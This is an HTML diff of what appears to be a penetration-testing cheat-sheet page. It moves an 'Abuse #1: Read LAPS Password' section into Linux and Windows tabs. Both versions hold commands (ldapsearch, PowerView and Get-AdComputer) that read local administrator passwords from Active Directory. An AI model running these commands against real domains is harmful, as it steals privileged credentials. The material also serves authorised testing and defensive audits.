@@ -197,18 +197,33 @@
 </ul>
 
 <div class="content"><hr>
-<h3 id="abuse-1-read-laps-password-from-windows">Abuse #1: Read LAPS password (From Windows)</h3>
-<h4 id="1-import-powerviewps1">1. Import PowerView.ps1</h4>
+<h3 id="abuse-1-read-laps-password">Abuse #1: Read LAPS Password</h3>
+<p>
+<button data-tabset="set1" data-tabcontent="tab1" class="active">Linux</button>
+
+<button data-tabset="set1" data-tabcontent="tab2" >Windows</button>
+
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ldapsearch -h 10.10.11.10 -b <span class="s1">&#39;DC=&lt;,example&gt;,DC=&lt;com&gt;&#39;</span> -x -D &lt;USER&gt;@&lt;TARGET&gt; -w &lt;PASSWORD&gt; <span class="s2">&#34;(ms-MCS-AdmPwd=*)&#34;</span> ms-MCS-AdmPwd
+</span></span></code></pre></div></div>
+</div>
+
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab2"><h4 id="1-import-powerviewps1">1. Import PowerView.ps1</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">.</span> <span class="p">.\</span><span class="n">PowerView</span><span class="p">.</span><span class="py">ps1</span>
-</span></span></code></pre></div><h4 id="2-create-cred-object-runas-optional">2. Create cred object (runas) [optional]</h4>
+</span></span></code></pre></div></div>
+<h4 id="2-create-cred-object-runas-optional">2. Create cred object (runas) [optional]</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$username</span> <span class="p">=</span> <span class="s2">&#34;&lt;DOMAIN&gt;\&lt;USER&gt;&#34;</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$password</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="p">&lt;</span><span class="n">PASSWORD</span><span class="p">&gt;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$cred</span> <span class="p">=</span> <span class="nb">new-object</span> <span class="n">-typename</span> <span class="n">System</span><span class="p">.</span><span class="py">Management</span><span class="p">.</span><span class="py">Automation</span><span class="p">.</span><span class="py">PSCredential</span> <span class="n">-argumentlist</span> <span class="nv">$username</span><span class="p">,</span> <span class="nv">$password</span>
-</span></span></code></pre></div><h4 id="3-read-laps-password">3. Read LAPS password</h4>
+</span></span></code></pre></div></div>
+<h4 id="3-read-laps-password">3. Read LAPS password</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Get-AdComputer</span> <span class="n">-Filter</span> <span class="p">*</span> <span class="n">-Properties</span> <span class="nb">ms-Mcs</span><span class="n">-AdmPwd</span> <span class="n">-Credential</span> <span class="nv">$cred</span>
-</span></span></code></pre></div><h3 id="abuse-1-read-laps-password-from-linux">Abuse #1: Read LAPS Password (From Linux)</h3>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ldapsearch -h 10.10.11.10 -b <span class="s1">&#39;DC=&lt;,example&gt;,DC=&lt;com&gt;&#39;</span> -x -D &lt;USER&gt;@&lt;TARGET&gt; -w &lt;PASSWORD&gt; <span class="s2">&#34;(ms-MCS-AdmPwd=*)&#34;</span> ms-MCS-AdmPwd
-</span></span></code></pre></div><br></div></div>
+</span></span></code></pre></div></div>
+</div></p>
+<br></div></div>
     
     <script src="/js/utils.js"></script>
     <footer>
